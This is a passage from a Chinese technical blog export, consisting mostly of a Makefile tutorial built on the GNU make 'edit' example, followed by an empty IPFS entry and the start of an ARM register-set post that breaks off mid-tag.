诉make命令如何编译和链接这几个文件。我们的规则是：</p><ol><li>如果这个工程没有编译过，那么我们的所有c文件都要编译并被链接。</li><li>如果这个工程的某几个c文件被修改，那么我们只编译被修改的c文件，并链接目标程序。</li><li>如果这个工程的头文件被改变了，那么我们需要编译引用了这几个头文件的c文件，并链接目标程序。</li></ol><p>只要我们的makefile写得够好，所有的这一切，我们只用一个make命令就可以完成，make命令会自动智能 地根据当前的文件修改的情况来确定哪些文件需要重编译，从而自动编译所需要的文件和链接目标程序。 </p><h3 id="Makefile规则"><a href="#Makefile规则" class="headerlink" title="Makefile规则"></a>Makefile规则</h3><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Makefile中，用#表示注释</span></span><br><span class="line">target ...:prerequisites...</span><br><span class="line">4command 1</span><br><span class="line">4<span class="comment">#注意命令前要用Tab</span></span><br><span class="line">4command 2</span><br><span class="line">4...</span><br><span class="line">4...</span><br><span class="line"><span class="comment">#可以使用“\”表示续行，但是“\”之后不能有空格</span></span><br></pre></td></tr></table></figure><ul><li><p>target</p><p>可以是一个object file（目标文件），也可以是一个执行文件，还可以是一个标签（label）。对 于标签这种特性，在后续的“伪目标”章节中会有叙述。</p></li><li><p>prerequisites</p><p>生成该target所依赖的文件和/或target</p></li><li><p>command</p><p>该target要执行的命令（任意的shell命令）</p></li></ul><p>这是一个文件的依赖关系，也就是说，<strong>target这一个或多个的目标文件依赖于prerequisites中的文件</strong>， 其生成规则定义在command中。说白一点就是说:</p><p><strong>prerequisites中如果有一个以上的文件比target文件要新的话，command所定义的命令就会被执行。</strong></p><p>这就是Makefile中最核心的规则。</p><h4 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h4><p>采用GNU make 手册中的例子</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">edit : main.o kbd.o command.o display.o \</span><br><span class="line">        insert.o search.o files.o utils.o</span><br><span class="line">    cc -o edit main.o kbd.o command.o display.o \</span><br><span class="line">        insert.o search.o files.o utils.o</span><br><span class="line"></span><br><span class="line">main.o : main.c defs.h</span><br><span class="line">    cc -c main.c</span><br><span class="line">kbd.o : kbd.c defs.h command.h</span><br><span class="line">    cc -c kbd.c</span><br><span class="line">command.o : command.c defs.h command.h</span><br><span class="line">    cc -c command.c</span><br><span class="line">display.o : display.c defs.h buffer.h</span><br><span class="line">    cc -c display.c</span><br><span class="line">insert.o : insert.c defs.h buffer.h</span><br><span class="line">    cc -c insert.c</span><br><span class="line">search.o : search.c defs.h buffer.h</span><br><span class="line">    cc -c search.c</span><br><span class="line">files.o : files.c defs.h buffer.h command.h</span><br><span class="line">    cc -c files.c</span><br><span class="line">utils.o : utils.c defs.h</span><br><span class="line">    cc -c utils.c</span><br><span class="line">clean :</span><br><span class="line">    rm edit main.o kbd.o command.o display.o \</span><br><span class="line">        insert.o search.o files.o utils.o</span><br></pre></td></tr></table></figure><p>该工程有3个头文件和8个c文件</p><p>其中反斜杠(“\”)是换行符，注意换行符之后不能用空格。换行符又利用Makefile的阅读。</p><p>把Makefile放在处于工程下的，然后在该目录下输入<code>make</code>命令，就可以生成可执行文件了。如果要删除执行文件和所有的中间目标文件，那么只需要执行<code>make clean</code>就可以了。</p><p>在这个makefile中，目标文件（target）包含：执行文件edit和中间目标文件（ <code>*.o</code> ），依赖文 件（prerequisites）就是冒号后面的那些 <code>.c</code> 文件和 <code>.h</code> 文件。每一个 <code>.o</code> 文件都有 一组依赖文件，而这些 <code>.o</code> 文件又是执行文件 <code>edit</code> 的依赖文件。依赖关系的实质就是说明了目 标文件是由哪些文件生成的，换言之，目标文件是哪些文件更新的。</p><p>这里要说明一点的是， <code>clean</code> 不是一个文件，它只不过是一个动作名字，有点像c语言中的label一 样，其冒号后什么也没有，那么，make就不会自动去找它的依赖性，也就不会自动执行其后所定义的命令。 要执行其后的命令，就要在make命令后明显得指出这个label的名字。这样的方法非常有用，我们可以在一 个makefile中定义不用的编译或是和编译无关的命令，比如程序的打包，程序的备份，等等。</p><h3 id="make的执行过程如下："><a href="#make的执行过程如下：" class="headerlink" title="make的执行过程如下："></a>make的执行过程如下：</h3><ol><li>依次读取变量“MAKEFILES”定义的makefile文件列表</li><li>读取工作目录下的makefile文件（GNU make的顺序：缺省的是根据命名的查找顺序“GNUmakefile”，“makefile”，“Makefile”，首先找到那个就读取那个（假如是MAKEFILE，需要用<code>make -f</code>））</li><li>依次读取工作目录makefile文件中使用指示符“include”包含的文件</li><li>查找重建所有已读取的makefile文件的规则（如果存在一个目标是当前读取的某一个makefile文件，则执行此规则重建此makefile文件，完成以后从第一步开始重新执行）</li><li>初始化变量值并展开那些需要立即展开的变量和函数并根据预设条件确定执行分支</li><li>根据“终极目标”以及其他目标的依赖关系建立依赖关系链表</li><li>执行除“终极目标”以外的所有的目标的规则（规则中如果依赖文件中任一个文件的时间戳比目标文件新，则使用规则所定义的命令重建目标文件）</li><li>执行“终极目标”所在的规则</li></ol><p>一上面那个工程为示例：</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">在默认的方式下，也就是我们只输入 <span class="built_in">make</span> 命令。那么，</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span><span class="built_in">make</span>会在当前目录下找名字叫“Makefile”或“makefile”的文件。</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>如果找到，它会找文件中的第一个目标文件（target），在上面的例子中，他会找到“<span class="keyword">edit</span>”这个 文件，并把这个文件作为最终的目标文件。</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>如果<span class="keyword">edit</span>文件不存在，或是<span class="keyword">edit</span>所依赖的后面的 .o 文件的文件修改时间要比 <span class="keyword">edit</span> 这个 文件新，那么，他就会执行后面所定义的命令来生成 <span class="keyword">edit</span> 这个文件。</span><br><span class="line"></span><br><span class="line"><span class="number">4.</span>如果 <span class="keyword">edit</span> 所依赖的 .o 文件也不存在，那么<span class="built_in">make</span>会在当前文件中找目标为 .o 文件 的依赖性，如果找到则再根据那一个规则生成 .o 文件。（这有点像一个堆栈的过程）</span><br><span class="line"></span><br><span class="line"><span class="number">5.</span>当然，你的C文件和H文件是存在的啦，于是<span class="built_in">make</span>会生成 .o 文件，然后再用 .o 文件生 成<span class="built_in">make</span>的终极任务，也就是执行文件 <span class="keyword">edit</span> 了。</span><br></pre></td></tr></table></figure><p>这就是整个make的依赖性，make会一层又一层地去找文件的依赖关系，直到最终编译出第一个目标文件。在 找寻的过程中，如果出现错误，比如最后被依赖的文件找不到，那么make就会直接退出，并报错，而对于所定义的命令的错误，或是编译不成功，make根本不理。make只管文件的依赖性。</p><p>像 <code>clean</code> 这种，没有被第一个目标文件直接或间接关联，那么它后面所定义的命 令将不会被自动执行，不过，我们可以显示要make执行。即命令—— <code>make clean</code> ，以此来清除所有 的目标文件，以便重编译。</p><p>如果这个工程已被编译过了，当我们修改了其中一个源文件，比如 <code>file.c</code> ， 那么根据我们的依赖性，我们的目标 <code>file.o</code> 会被重编译（也就是在这个依性关系后面所定义的命令）， 于是 <code>file.o</code> 的文件也是最新的啦，于是 <code>file.o</code> 的文件修改时间要比 <code>edit</code> 要新，所 以 <code>edit</code> 也会被重新链接了（详见 <code>edit</code> 目标文件后定义的命令）。比如我们改变了 <code>command.h</code> ，那么， <code>kdb.o</code> 、 <code>command.o</code> 和 <code>files.o</code> 都 会被重编译，并且， <code>edit</code> 会被重链接。</p><h3 id="Makefile中使用变量"><a href="#Makefile中使用变量" class="headerlink" title="Makefile中使用变量"></a>Makefile中使用变量</h3><p>总所周知，变量是个好东西0.0</p><p>在Makefile中使用变量有利于我们对其有更好的维护性。</p><p>跟通常编程一样，变量名最好简(jian)洁(dan)易(cu)懂(bao)，有利于人们明白其代表的含义。</p><p>在上面例子中，edit后面的一串便可以进行替代了。</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">edit : main.o kbd.o command.o display.o \</span><br><span class="line">        insert.o search.o files.o utils.o</span><br><span class="line">    cc -o edit main.o kbd.o command.o display.o \</span><br><span class="line">        insert.o search.o files.o utils.o</span><br></pre></td></tr></table></figure><p>当我们需要添加文件时，需要修改多个地方，使用变量能很好地为我们节省时间。</p><p>只需在前面声明变量就好，比如<code>objects</code>，<code>objs</code>，<code>obj</code>等等，只要能很好明白其代表的含义就行</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">objs = main.o kbd.o command.o display.o \</span><br><span class="line">     insert.o search.o files.o utils.o</span><br><span class="line">     </span><br><span class="line">edit : <span class="variable">$(objs)</span></span><br><span class="line">    cc -o edit <span class="variable">$(objs)</span></span><br><span class="line">main.o : main.c defs.h</span><br><span class="line">    cc -c main.c</span><br><span class="line">kbd.o : kbd.c defs.h command.h</span><br><span class="line">    cc -c kbd.c</span><br><span class="line">command.o : command.c defs.h command.h</span><br><span class="line">    cc -c command.c</span><br><span class="line">display.o : display.c defs.h buffer.h</span><br><span class="line">    cc -c display.c</span><br><span class="line">insert.o : insert.c defs.h buffer.h</span><br><span class="line">    cc -c insert.c</span><br><span class="line">search.o : search.c defs.h buffer.h</span><br><span class="line">    cc -c search.c</span><br><span class="line">files.o : files.c defs.h buffer.h command.h</span><br><span class="line">    cc -c files.c</span><br><span class="line">utils.o : utils.c defs.h</span><br><span class="line">    cc -c utils.c</span><br><span class="line">clean :</span><br><span class="line">    rm edit <span class="variable">$(objs)</span></span><br></pre></td></tr></table></figure><p>比如这样，当我们需要添加新的 <code>.o</code> 文件的时候，只需要修改<code>objs =    ...</code>就行了</p><h3 id="Makefile的自动推导"><a href="#Makefile的自动推导" class="headerlink" title="Makefile的自动推导"></a>Makefile的自动推导</h3><p>GNU的make可以自动推到文件及文件依赖关系后面的命令，于是我们就没必要去在每一个 <code>.o</code> 文件后都写上类似的命令，因为，我们的make会自动识别，并自己推导命令。</p><p>只要make看到一个 <code>.o</code> 文件，它就会自动的把 <code>.c</code> 文件加在依赖关系中，如果make找到一个<code>whatever.o</code> ，那么 <code>whatever.c</code> 就会是 <code>whatever.o</code> 的依赖文件。并且 <code>cc -c whatever.c</code> 也会被推导出来，于是，我们的makefile再也不用写得这么复杂。我们的 新makefile又出炉了。</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">objects = main.o kbd.o command.o display.o \</span><br><span class="line">    insert.o search.o files.o utils.o</span><br><span class="line"></span><br><span class="line">edit : <span class="variable">$(objects)</span></span><br><span class="line">    cc -o edit <span class="variable">$(objects)</span></span><br><span class="line"></span><br><span class="line">main.o : defs.h</span><br><span class="line">kbd.o : defs.h command.h</span><br><span class="line">command.o : defs.h command.h</span><br><span class="line">display.o : defs.h buffer.h</span><br><span class="line">insert.o : defs.h buffer.h</span><br><span class="line">search.o : defs.h buffer.h</span><br><span class="line">files.o : defs.h buffer.h command.h</span><br><span class="line">utils.o : defs.h</span><br><span class="line"></span><br><span class="line">.PHONY : clean</span><br><span class="line">clean :</span><br><span class="line">    rm edit <span class="variable">$(objects)</span></span><br></pre></td></tr></table></figure><p>这种方法，也就是make的“隐晦规则”。</p><p><code>.PHONY</code> 表示 <code>clean</code> 是个伪目标 文件。</p><h4 id="另类风格的Makefile"><a href="#另类风格的Makefile" class="headerlink" title="另类风格的Makefile"></a>另类风格的Makefile</h4><p>既然我们的make可以自动推导命令，那么我看到那堆 <code>.o</code> 和 <code>.h</code> 的依赖就有点不爽，那么多的 重复的 <code>.h</code> ，能不能把其收拢起来，好吧，没有问题，这个对于make来说很容易，谁叫它提供了自动 推导命令和文件的功能呢？来看看最新风格的makefile吧。</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">objects = main.o kbd.o command.o display.o \</span><br><span class="line">    insert.o search.o files.o utils.o</span><br><span class="line"></span><br><span class="line">edit : <span class="variable">$(objects)</span></span><br><span class="line">    cc -o edit <span class="variable">$(objects)</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$(objects)</span> : defs.h</span><br><span class="line">kbd.o command.o files.o : command.h</span><br><span class="line">display.o insert.o search.o files.o : buffer.h</span><br><span class="line"></span><br><span class="line">.PHONY : clean</span><br><span class="line">clean :</span><br><span class="line">    rm edit <span class="variable">$(objects)</span></span><br></pre></td></tr></table></figure><h3 id="清空目标文件的规则"><a href="#清空目标文件的规则" class="headerlink" title="清空目标文件的规则"></a>清空目标文件的规则</h3><p>每个Makefile中都应该写一个清空目标文件（ <code>.o</code> 和执行文件）的规则，这不仅便于重编译，也很 利于保持文件的清洁。</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">clean:</span></span><br><span class="line">    rm edit <span class="variable">$(objects)</span></span><br></pre></td></tr></table></figure><p>更为稳健的做法是：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.PHONY : clean</span><br><span class="line">clean :</span><br><span class="line">    -rm edit <span class="variable">$(objects)</span></span><br></pre></td></tr></table></figure><p>前面说过， <code>.PHONY</code> 表示 <code>clean</code> 是一个“伪目标”。而在 <code>rm</code> 命令前面加了一个小减号的 意思就是，也许某些文件出现问题，但不要管，继续做后面的事。当然， <code>clean</code> 的规则不要放在文件 的开头，不然，这就会变成make的默认目标，相信谁也不愿意这样。不成文的规矩是——“clean从来都是放 在文件的最后”。</p><h3 id="Makefile里有什么？"><a href="#Makefile里有什么？" class="headerlink" title="Makefile里有什么？"></a>Makefile里有什么？</h3><p>Makefile里主要包含了五个东西：显式规则、隐晦规则、变量定义、文件指示和注释。</p><ol><li><p>显式规则。显式规则说明了如何生成一个或多个目标文件。这是由Makefile的书写者明显指出要生成的 文件、文件的依赖文件和生成的命令。</p></li><li><p>隐晦规则。由于我们的make有自动推导的功能，所以隐晦的规则可以让我们比较简略地书写 Makefile，这是由make所支持的。</p></li><li><p>变量的定义。在Makefile中我们要定义一系列的变量，变量一般都是字符串，这个有点像你C语言中的 宏，当Makefile被执行时，其中的变量都会被扩展到相应的引用位置上。</p></li><li><p>文件指示。其包括了三个部分，一个是在一个Makefile中引用另一个Makefile，就像C语言中 的include一样；另一个是指根据某些情况指定Makefile中的有效部分，就像C语言中的预编译#if一 样；还有就是定义一个多行的命令。有关这一部分的内容，我会在后续的部分中讲述。</p></li><li><p>注释。Makefile中只有行注释，和UNIX的Shell脚本一样，其注释是用 <code>#</code> 字符，这个就 像C/C++中的 <code>//</code> 一样。如果你要在你的Makefile中使用 <code>#</code> 字符，可以用反斜杠进行转义，如： <code>\#</code> 。</p></li></ol><p>   还有的就是在Makefile中的命令，必须要以 <code>Tab</code> 键开始。</p><h3 id="Makefile的文件名"><a href="#Makefile的文件名" class="headerlink" title="Makefile的文件名"></a>Makefile的文件名</h3><p>因为make程序已被用户多次重/改写，其中包括几次用相同的文件格式和算法原理重新编写，并且依照不同需要添加了一些不常见的改良。</p><p>现在的版本，大致是 <strong>GNU make</strong>，<strong>BSD make</strong>，<strong>Microsoft nmake</strong>。</p><p>默认的情况下，gnu的make命令会在当前目录下按顺序找寻文件名为“GNUmakefile”、 “makefile”、“Makefile”的文件，找到了解释这个文件。在这三个文件名中，最好使用“Makefile” 这个文件名，因为，这个文件名第一个字符为大写，这样有一种显目的感觉。最好不要用“GNUmakefile”， 这个文件是GNU的make识别的。有另外一些make只对全小写的“makefile”文件名敏感，但是基本上来说， 大多数的make都支持“makefile”和“Makefile”这两种默认文件名。</p><p>当然，你可以使用别的文件名来书写Makefile，比如：“Make.Linux”，“Make.Solaris” ，“Make.AIX”等，如果要指定特定的Makefile，你可以使用make的 <code>-f</code> 和 <code>--file</code> 参数， 如： <code>make -f Make.Linux</code> 或 <code>make --file Make.AIX</code> 。</p><h3 id="引用其他的Makefile"><a href="#引用其他的Makefile" class="headerlink" title="引用其他的Makefile"></a>引用其他的Makefile</h3><p>在Makefile使用 <code>include</code> 关键字可以把别的Makefile包含进来，这很像C语言的 <code>#include</code> ，被包含的文件会原模原样的放在当前文件的包含位置。 <code>include</code> 的语法是：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> &lt;filename&gt;</span><br></pre></td></tr></table></figure><p><code>filename</code> 可以是当前操作系统Shell的文件模式（可以包含路径和通配符）。</p><p>在 <code>include</code> 前面可以有一些空字符，但是绝不能是 <code>Tab</code> 键开始。 <code>include</code> 和 <code>&lt;filename&gt;</code> 可以用一个或多个空格隔开。举个例子，你有这样几个Makefile： <code>a.mk</code> 、 <code>b.mk</code> 、 <code>c.mk</code> ，还有一个文件叫 <code>foo.make</code> ，以及一个变量 <code>$(bar)</code> ，其包含 了 <code>e.mk</code> 和 <code>f.mk</code> ，那么，下面的语句：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bar=e.mkf.mk</span><br><span class="line"><span class="keyword">include</span> foo.make *.mk <span class="variable">$(bar)</span></span><br></pre></td></tr></table></figure><p>等价于：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> foo.make a.mk b.mk c.mk e.mk f.mk</span><br></pre></td></tr></table></figure><p>make命令开始时，会找寻 <code>include</code> 所指出的其它Makefile，并把其内容安置在当前的位置。就好 像C/C++的 <code>#include</code> 指令一样。如果文件都没有指定绝对路径或是相对路径的话，make会在当前目 录下首先寻找，如果当前目录下没有找到，那么，make还会在下面的几个目录下找：</p><ol><li>如果make执行时，有 <code>-I</code> 或 <code>--include-dir</code> 参数，那么make就会在这个参数所指定的目 录下去寻找。</li><li>如果目录 <code>&lt;prefix&gt;/include</code> （一般是： <code>/usr/local/bin</code> 或 <code>/usr/include</code> ）存在的话，make也会去找。</li></ol><p>如果有文件没有找到的话，make会生成一条警告信息，但不会马上出现致命错误。它会继续载入其它的 文件，一旦完成makefile的读取，make会再重试这些没有找到，或是不能读取的文件，如果还是 不行，make才会出现一条致命信息。如果你想让make不理那些无法读取的文件，而继续执行，你可以 在include前加一个减号“-”。如：</p><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-<span class="ruby"><span class="keyword">include</span> &lt;filename&gt;</span></span><br></pre></td></tr></table></figure><p>其表示，无论include过程中出现什么错误，都不要报错继续执行。和其它版本make兼容的相关命令 是sinclude，其作用和这一个是一样的。</p><h3 id="环境变量MAKEFILES"><a href="#环境变量MAKEFILES" class="headerlink" title="环境变量MAKEFILES"></a>环境变量MAKEFILES</h3><p>如果你的当前环境中定义了环境变量 <code>MAKEFILES</code> ，那么，make会把这个变量中的值做一个类似于<code>include</code> 的动作。这个变量中的值是其它的Makefile，用空格分隔。只是，它和 <code>include</code> 不 同的是，从这个环境变量中引入的Makefile的“目标”不会起作用，如果环境变量中定义的文件发现 错误，make也会不理。</p><p>但是在这里我还是建议不要使用这个环境变量，因为只要这个变量一被定义，那么当你使用make时， 所有的Makefile都会受到它的影响，这绝不是你想看到的。在这里提这个事，只是为了告诉大家，也许 有时候你的Makefile出现了怪事，那么你可以看看当前环境中有没有定义这个变量。</p><h3 id="make的工作流程"><a href="#make的工作流程" class="headerlink" title="make的工作流程"></a>make的工作流程</h3><p>GNU的make工作时的执行步骤如下：（想来其它的make也是类似）</p><ol><li>读入所有的Makefile。</li><li>读入被include的其它Makefile。</li><li>初始化文件中的变量。</li><li>推导隐晦规则，并分析所有规则。</li><li>为所有的目标文件创建依赖关系链。</li><li>根据依赖关系，决定哪些目标要重新生成。</li><li>执行生成命令。</li></ol><p>1-5步为第一个阶段，6-7为第二个阶段。第一个阶段中，如果定义的变量被使用了，那么，make会把其展 开在使用的位置。但make并不会完全马上展开，make使用的是拖延战术，如果变量出现在依赖关系的规则 中，那么仅当这条依赖被决定要使用了，变量才会在其内部展开。</p><p>当然，这个工作方式你不一定要清楚，但是知道这个方式你也会对make更为熟悉。有了这个基础，后续部分 也就容易看懂了。</p><h2 id="书写规则"><a href="#书写规则" class="headerlink" title="书写规则"></a>书写规则</h2>]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> c++ </tag>
            
            <tag> make </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IPFS</title>
      <link href="/2019/05/30/IPFS/"/>
      <url>/2019/05/30/IPFS/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> Network </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Network </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ARM</title>
      <link href="/2019/05/28/ARM/"/>
      <url>/2019/05/28/ARM/</url>
      
        <content type="html"><![CDATA[<h1 id="ARM指令集详解"><a href="#ARM指令集详解" class="headerlink" title="ARM指令集详解"></a>ARM指令集详解</h1><blockquote><p>引用：</p><p><a href="https://blog.csdn.net/u014069939/article/details/81107340" target="_blank" rel="noopener"><strong>ARM指令集详解</strong></a></p></blockquote><h1 id="1-汇编"><a href="#1-汇编" class="headerlink" title="1.       汇编"></a>1.       汇编</h1><h2 id="1-1-通用寄存器"><a href="#1-1-通用寄存器" class="headerlink" title="1.1.    通用寄存器"></a>1.1.    通用寄存器</h2><p><img src="https://magic-king.net/images/loading.gif" data-original="ARM/arm.JPG" alt="Register"></p><table><br>    <tr><br>        <td>寄存器类别</td><br>        <td>寄存器在汇编中的名称</td><br>        <td>各模式下实际访问的寄存器</td><br>        <td></td><br>        <td></td><br>        <td></td><br>        <td></td><br>        <td></td><br>        <td></td><br>    </tr><br>    <tr><br>        <td></td><br>        <td></td><br>        <td>用户</td><br>        <td>系统</td><br>        <td>管理</td><br>        <td>中止</td><br>        <td>未定义</td><br>        <td>中断</td><br>        <td>快中断</td><br>    </tr><br>    <tr><br>        <td>通用寄存器和程序计数器</td><br>        <td>R0(a1)</td><br>        <td>R0</td><br>        <td></td><br>        <td></td><br>        <td></td><br>        <td></td><br>        <td></td><br>        <td></td><br>    </tr><br>    <tr><br>        <td></td><br>        <td>R1(a2)</td><br>        <td>R1</td><br>        <td></td><br>        <td></td><br>        <td></td><br>        <td></td><br>        <td></td><br>        <td></td><br>    </tr><br>    <tr><br>        <td></td><br>        <td>R2(a3)</td><br>        <td>R2</td><br>        <td></td><br>        <td></td><br>        <td></td><br>        <td></td><br>        <td></td><br>        <td></td><br>    </tr><br>    <tr><br>        <td></td><br>        <td>R3(a4)</td><br>        <td>R3</td><br>        <td></td><br>        <td></td><br>        <td></td><br>        <td></td><br>        <td></td><br>        <td></td><br>    </tr><br>    <tr><br>        <td></td><br>        <td>R4(v1)</td><br>        <td>R4</td><br>        <td></td><br>        <td></td><br>        <td></td><br>        <td></td><br>        <td></td><br>        <td></td><br>    </tr><br>    <tr><br>        <td></td><br>        <td>R5(v2)</td><br>        <td>R5</td><br>        <td></td><br>        <td></td><br>        <td></td><br>        <td></td><br>        <td></td><br>        <td></td><br>    </tr><br>    <tr><br>        <td></td><br>        <td>R6(v3)</td><br>        <td>R6</td><br>        <td></td><br>        <td></td><br>        <td></td><br>        <td></td><br>        <td></td><br>        <td></td><br>    </tr><br>    <tr><br>        <td></td><br>        <td>R7(v4)</td><br>        <td>R7</td><br>        <td></td><br>        <td></td><br>        <td></td><br>        <td></td><br>        <td></td><br>        <td></td><br>    </tr><br>    <tr><br>        <td></td><br>        <td>R8(v5)</td><br>        <td>R8</td><br>        <td></td><br>        <td></td><br>        <td></td><br>        <td></td><br>        <td></td><br>        <td>R8_fiq <em></em></td><br>    </tr><br>    <tr><br>        <td></td><br>        <td>R9(SB,v6)</td><br>        <td>R9</td><br>        <td></td><br>        <td></td><br>        <td></td><br>        <td></td><br>        <td></td><br>        <td>R9_fiq </td><br>    </tr><br>    <tr><br>        <td></td><br>        <td>R10(SL,v7)</td><br>        <td>R10</td><br>        <td></td><br>        <td></td><br>        <td></td><br>        <td></td><br>        <td></td><br>        <td>R10_fiq <em></em></td><br>    </tr><br>    <tr><br>        <td></td><br>        <td>R11(FP,v8)</td><br>        <td>R11</td><br>        <td></td><br>        <td></td><br>        <td></td><br>        <td></td><br>        <td></td><br>        <td>R11_fiq </td><br>    </tr><br>    <tr><br>        <td></td><br>        <td>R12(IP)</td><br>        <td>R12</td><br>        <td></td><br>        <td></td><br>        <td></td><br>        <td></td><br>        <td></td><br>        <td>R12_fiq <em></em></td><br>    </tr><br>    <tr><br>        <td></td><br>        <td>R13(SP)</td><br>        <td>R13</td><br>        <td></td><br>        <td>R13_svc</td><br>        <td>R13_abt <em></em></td><br>        <td>R13_und </td><br>        <td>R13_irq <em></em></td><br>        <td>R13_fiq </td><br>    </tr><br>    <tr><br>        <td></td><br>        <td>R14(LR)</td><br>        <td>R14</td><br>        <td></td><br>        <td>R14_svc <em></em></td><br>        <td>R14_abt </td><br>        <td>R14_und <em></em></td><br>        <td>R14_irq </td><br>        <td>R14_fiq *</td><br>    </tr><br>    <tr><br>        <td></td><br>        <td>R15(PC)</td><br>        <td>R15</td><br>        <td></td><br>        <td></td><br>        <td></td><br>        <td></td><br>        <td></td><br>        <td></td><br>    </tr><br>    <tr><br>        <td>状态寄存器</td><br>        <td>R16(CPSR)</td><br>        <td>CPSR</td><br>        <td></td><br>        <td></td><br>        <td></td><br>        <td></td><br>        <td></td><br>        <td></td><br>    </tr><br>    <tr><br>        <td></td><br>        <td>SPSR</td><br>        <td>无</td><br>        <td></td><br>        <td>SPSR_svc</td><br>        <td>SPSR_abt</td><br>        <td>SPSR_und</td><br>        <td>SPSR_irq</td><br>        <td>SPSR_fiq</td><br>    </tr><br>    <tr><br>        <td></td><br>    </tr><br></table><p><img src="https://magic-king.net/images/loading.gif" data-original="ARM/arm_allRegister.png" alt="register"></p><p>通用寄存器</p><p>37个寄存器，31个通用寄存器，6个状态寄存器。</p><p>R12是内部调用暂时寄存器 ip。它在过程链接胶合代码（例如，交互操作胶合代码）中用于此角色。在过程调用之间，可以将它用于任何用途。被调用函数在返回之前不必恢复 r12。</p><p>R13堆栈指针sp，R14返回指针，R15为PC指针, cpsr_c代表的是这32位中的低8位，也就是控制位</p><p>CPSR有4个8位区域：标志域（F）、状态域（S）、扩展域（X）、控制域（C）<br>MSR - Load specified fields of the CPSR or SPSR with an immediate constant, orfrom the contents of a general-purpose register. Syntax: MSR{cond} _, #immed_8rMSR{cond} _, Rm where: cond is an optional condition code. is either CPSR orSPSR. specifies the field or fields to be moved. can be one or more of: ccontrol field mask byte (PSR[7:0]) x extension field mask byte (PSR[15:8]) sstatus field mask byte (PSR[23:16) f flags field mask byte (PSR[31:24]).immed_8r is an expression evaluating to a numeric constant. The constant mustcorrespond to an 8-bit pattern rotated by an even number of bits within a32-bit word. Rm is the source register.</p><p> C 控制域屏蔽字节(psr[7:0]) </p><p>X 扩展域屏蔽字节(psr[15:8]) </p><p>S 状态域屏蔽字节(psr[23:16])</p><p> F 标志域屏蔽字节(psr[31:24])</p><p> <img src="https://magic-king.net/images/loading.gif" data-original="ARM/register.JPG" alt="img"></p><p><img src="https://magic-king.net/images/loading.gif" data-original="ARM/arm_register.png" 